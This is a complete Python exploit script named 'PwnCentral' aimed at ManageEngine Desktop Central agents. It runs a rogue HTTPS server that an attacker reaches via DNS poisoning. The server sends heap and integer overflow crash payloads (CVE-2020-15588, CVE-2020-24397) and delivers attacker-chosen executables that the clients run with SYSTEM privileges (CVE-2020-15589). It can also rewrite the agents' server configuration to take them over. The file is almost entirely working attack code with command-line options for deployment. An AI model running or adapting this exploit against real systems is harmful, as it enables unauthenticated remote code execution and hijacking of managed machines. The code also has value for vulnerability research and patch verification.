#!/usr/bin/env python
from http.server import BaseHTTPRequestHandler, HTTPServer
import os, ssl, sys, argparse, logging

"""PwnCentral - Exploit for Zoho Corp ManageEngine Desktop Central

This exploit requires a Python3 interpreter and
key.pem and cert.pem in the current directory in order to run.

This exploit includes
* crash PoCs for two int overflow/heap memory
  corruption vulns (CVE-2020-15588 and CVE-2020-24397).
  
  Vulnerable versions:
  any version of Desktop Central prior to build 10.0.561
  (https://www.manageengine.com/products/desktop-central/integer-overflow-vulnerability.html)

* exploit code that enables unauthenticated RCE with SYSTEM privileges
  on vulnerable clients (CVE-2020-15589).

  Vulnerable versions:
  any version of Desktop Central prior to build 100646
  (https://www.manageengine.com/products/desktop-central/untrusted-agent-server-communication.html)

Exploitation of this issue requires an attacker to cause a
Desktop Central client to connect to a malicious server, for
example by conducting a DNS poisoning attack.

Further details:
https://github.com/patois/zohocorp_dc
"""


BANNER = """
PwnCentral - Exploit for Zoho Corp ManageEngine Desktop Central
===============================================================

targets:    CVE-2020-15588, CVE-2020-15589, CVE-2020-24397
author:     patois (https://github.com/patois)
date:       2020-10-02
"""

TS_FILENAME = None
AU_FILENAME = None
CRASH = False
TAKEOVER = False
TAKEOVER_CONFIG = """<?xml version='1.0' encoding='utf-8'?><meta-data>
    <DCServerInfo server_mac_ipaddr="%s" https_port="%s" server_id="1" server_port="%s"/>
</meta-data>
"""

class DesktopCentralMitmServer(BaseHTTPRequestHandler):
    def handle_post_request(self):

        logging.info("\ttrying to exploit CVE-2020-15588")
        message = "A"*1024*1024
        try:
            self.send_response(200)
            self.send_header("Content-Type","text/html")
            self.send_header("Content-Encoding", "identity")
            # replace content-length value with 4293967291 (0xFFFFFFFB)
            # for exploiting CVE-2020-24397
            self.send_header("Content-Length", 1073741830)
            self.end_headers()
            self.wfile.write(bytes(message, "utf-8"))
            logging.info("\tsent crash payload :)")
        except:
            logging.warning("\terror sending crash payload")
        return

    def handle_get_executable(self, filename):
        f = open(filename, "rb")
        buf = f.read()
        f.close()
        if self._send_binary(buf):
            logging.info("\tdeployed %s on target machine :)" % os.path.basename(filename))
        else:
            logging.warning("\tfailed sending executable")
        return

    def handle_get_config(self):
        if self._send_text("CompressionEnable:No\x0aSecureDcProcess:No"):
            logging.info("\tsent config.txt")
        else:
            logging.warning("\tfailed sending config.txt")
        return

    def handle_get_metadata(self):
        if self._send_text(TAKEOVER_CONFIG):
            logging.info("\tsent rogue server config :)")
        else:
            logging.warning("\tfailed sending server config")
        return

    def _send_binary(self, buf):
        """send application/octet-stream
        """

        success = False
        try:
            self.send_response(200)
            self.send_header("Content-Type","application/octet-stream")
            self.send_header("Content-Length", len(buf))
            self.end_headers()
            self.wfile.write(buf)
            success = True
        except:
            pass
        return success

    def _send_text(self, msg, code=200):
        """send text/html
        """

        success = False
        message = "%s" % msg
        try:
            self.send_response(code)
            self.send_header("Content-Type","text/html")
            self.send_header("Content-Encoding", "identity")
            self.send_header("Content-Length", len(message))
            self.end_headers()
            self.wfile.write(bytes(message, "utf-8"))
            success = True
        except:
            pass
        return success

    # GET   
    def do_GET(self):
        """
        logging.debug("GET request from %s\n\nPath:\n%s\n\nHeaders:\n%s\n\n" % (
                self.client_address[0],
                str(self.path),
                "\n".join(["%s: %s" % (hdr[0], hdr[1]) for hdr in self.headers.items()])))"""

        ua = self.headers["User-Agent"]
        if ua and "desktopcentralagent" in ua.lower().replace(" ", ""):
            if AU_FILENAME and "AgentUpgrader.exe" in self.path:
                logging.info("handling AgentUpgrader request from %s" % self.client_address[0])
                self.handle_get_executable(AU_FILENAME)
            elif TS_FILENAME:
                if "agentAuthPropsRequest" in self.path:
                    logging.info("handling agentAuthPropsRequest request from %s" % self.client_address[0])
                    logging.info("\tsending 404 to make it request dcTroubleshoot.exe")
                    self._send_text("gonna pwn you", 404)
                elif "dcTroubleshoot.exe" in self.path:
                    logging.info("handling dcTroubleshoot request from %s" % self.client_address[0])
                    self.handle_get_executable(TS_FILENAME)
            elif TAKEOVER and "meta-data" in self.path:
                logging.info("handling meta-data request from %s" % self.client_address[0])
                self.handle_get_metadata()
            elif CRASH and "config.txt" in self.path:
                logging.info("handling config request from %s" % self.client_address[0])
                self.handle_get_config()
            elif "agent-settings.xml" in self.path:
                logging.debug("handling agent-settings.xml request from %s" % self.client_address[0])
                logging.debug("\tnot implemented: for customization, see agent\\agent-settings.xml")
                self._send_text("404", code=404)
            elif "ns-status-details.xml" in self.path:
                logging.info("handling notification request from %s" % self.client_address[0])
                logging.info("\tsending 404 to make it keep sending notifications")
                self._send_text("404", code=404)
            else:
                self._send_text("not supported", code=404)
        else:
            # don't handle requests from clients with user agents other than Desktop Central's
            logging.debug("\tignoring (unsupported) request, sending 404")
            self._send_text("404", code=404)
        return
    
    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length)
        logging.debug("POST request from %s\n\nPath:\n%s\n\nHeaders:\n%s\n\nBody:\n%s\n\n" % (
                self.client_address[0],
                str(self.path),
                "\n".join(["%s: %s" % (hdr[0], hdr[1]) for hdr in self.headers.items()]),
                post_data.decode("utf-8")))
                
        ua = self.headers["User-Agent"]
        if ua and CRASH and "desktopcentralagent" in ua.lower().replace(" ", ""):
            logging.info("handling POST request from %s" % self.client_address[0])
            self.handle_post_request()
        else:
            self._send_text("you dont say!", code=404)
        return

    def log_message(self, format, *args):
        return

def run():
    global AU_FILENAME
    global TS_FILENAME
    global CRASH
    global TAKEOVER
    global TAKEOVER_CONFIG

    parser = argparse.ArgumentParser()
    parser.add_argument("ip", type=str, help="IP/hostname to bind this server to")
    parser.add_argument("port", type=int, help="HTTPS TCP listening port (default is 8383)")
    parser.add_argument("-d", "--debug", action="store_true",
                        help="enable debug output")
    parser.add_argument("-s", "--server", type=str,
                        help=("take over client by changing its server configuration. "
                        "format of new server configuration is <ip_or_hostname>:<https_port>:<port>"))
    parser.add_argument("-u", "--upgrader", type=str,
                        help=("path to executable to be deployed and run on target (SYSTEM privs). "
                        "This option should be combined with the --server option"))
    parser.add_argument("-t", "--troubleshooter", type=str,
                        help="path to executable to be deployed and run on target (SYSTEM privs)")
    parser.add_argument("-c", "--crash", action="store_true",
                        help="exploits int/heap overflow (client crash PoC)")
    args = parser.parse_args()

    for required in ["key.pem", "cert.pem"]:
        if not os.path.exists(required):
            print("error: key.pem and cert.pem not found!")
            return


    AU_FILENAME = args.upgrader
    TS_FILENAME = args.troubleshooter
    CRASH = args.crash
    if args.server:
        TAKEOVER = True
        TAKEOVER_CONFIG = TAKEOVER_CONFIG % tuple(args.server.split(":"))

    logging.basicConfig(
        format="[%(asctime)s] [%(levelname)s]\t%(message)s",
        level=logging.DEBUG if args.debug else logging.INFO,
        datefmt="%H:%M:%S")

    print("%s" % BANNER)

    # Server settings
    server_address = (args.ip, args.port)
    httpd = HTTPServer(server_address, DesktopCentralMitmServer)

    httpd.socket = ssl.wrap_socket(httpd.socket, 
                                    keyfile="key.pem",
                                    certfile="cert.pem",
                                    server_side=True)

    if not any([args.debug, args.upgrader, args.troubleshooter, args.crash]):
        logging.warning("o:no options specified!")

    if args.debug:
        logging.info("o:debug-output")
    if args.server:
        logging.info("o:rogue server config: %s" % args.server)
    if args.upgrader:
        logging.info("o:deployment of upgrader excecutable: %s" % args.upgrader)
    if args.troubleshooter:
        logging.info("o:deployment of troubleshooter excecutable: %s" % args.troubleshooter)
    if args.crash:
        logging.info("o:target process crash (int/heap overflow)")

    logging.info("running PwnCentral server on %s:%d" % (args.ip, args.port))
    logging.info("waiting for incoming connections...")
    httpd.serve_forever()
    return

if __name__ == "__main__":
    run()